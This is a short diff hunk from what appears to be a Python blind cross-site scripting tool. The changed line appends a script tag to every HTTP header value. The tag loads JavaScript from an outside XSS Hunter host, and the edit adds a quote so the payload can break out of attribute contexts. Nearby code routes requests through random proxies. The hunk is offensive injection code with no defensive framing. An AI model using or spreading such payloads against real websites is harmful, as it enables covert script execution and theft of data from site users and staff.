@@ -113,7 +113,7 @@ proxy = {"http": randomProxy, "https": randomProxy}
 
 # change dictionary value => plus xss_hunter payloud
 for key, value in HEADERS.items():
-    HEADERS[key] = value+'"><script src=https://'+XSSHUNTER+'.xss.ht></script>'
+    HEADERS[key] = value+'\'"><script src=https://'+XSSHUNTER+'.xss.ht></script>'
 
 
 # Function: tool execute
